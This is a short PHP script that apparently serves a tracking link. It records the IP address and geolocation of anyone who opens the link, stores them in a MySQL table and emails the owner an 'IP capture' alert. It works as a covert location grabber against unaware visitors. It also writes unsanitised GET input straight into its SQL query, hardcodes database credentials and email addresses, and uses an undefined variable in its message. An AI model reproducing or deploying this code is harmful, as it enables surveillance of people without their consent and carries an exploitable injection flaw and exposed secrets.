<?php
session_start();
$registrarIP = $_GET['ip'];
$registrarLatitud = $_GET['latitude'];
$registrarLongitud = $_GET['longitude'];

include "../correos/configuracion-de-correo.php";

//include "../php-scripts/Conexión.php";
$conexión = new mysqli("localhost", "darkseid", "DarkseidPower23!!", "localizacionesLink");
$sql = $conexión->query("INSERT INTO `displays` VALUES('', '$registrarIP', '$registrarLatitud', '$registrarLongitud')");


$ubicación = ($registrarLatitud . ", " . $registrarLongitud);

$mail->ClearAllRecipients();

$mail->AddAddress("dantecc10@gmail.com");
$mail->AddCC("dante@castelancarpinteyro.com");
$mail->AddCC("");

$mail->IsHTML(true);  //podemos activar o desactivar HTML en mensaje
$mail->Subject = 'Nueva captura de IP';

$msg = "<h1>Captura IP:</h1>
    <p>Se ha abierto este link con la IP $ip, con localización aproximada en $ubicación según JavaScript.</p>
    
    <p>Se ha abierto este link con la IP $ip, con localización aproximada en $ubicación según JavaScript.</p>
    ";

$mail->Body = $msg;
$mail->Send();
